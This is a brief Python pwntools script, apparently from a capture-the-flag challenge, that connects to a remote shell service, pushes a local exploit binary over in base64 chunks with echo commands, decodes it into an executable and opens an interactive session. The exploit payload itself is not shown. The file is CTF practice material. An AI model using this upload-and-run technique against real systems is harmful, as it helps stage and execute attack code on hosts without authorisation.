#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

import os

def send_cmd(cmd):
    r.sendlineafter("$", cmd)

#r = process(["./run.sh","-d"])
r = remote("brainfuck64-01.pwn.beer", 31337)
log.success("prepare empty binary...")
send_cmd("cp /bin/busybox /home/user/poc")
send_cmd("cp /bin/busybox /home/user/pwn")
send_cmd("echo -ne \"\" > /home/user/poc")


iii = open("./exp", "rb").read() # pwn binary

b64 = iii.encode('base64')
b64 = ''.join(b64.split("\n"))
now = 0

log.success("write base64 string to binary...")
seg = 500
while now < len(b64):
    cur = b64[now:now+seg:]
    cmd = "echo -ne \"{}\" >> /home/user/poc".format(cur)
    log.info("sending {} / {} ...".format(now+seg, len(b64)))
    send_cmd(cmd)
    now += seg

log.success("base64 decoding...")
send_cmd("base64 -d /home/user/poc > /home/user/pwn")
r.interactive()
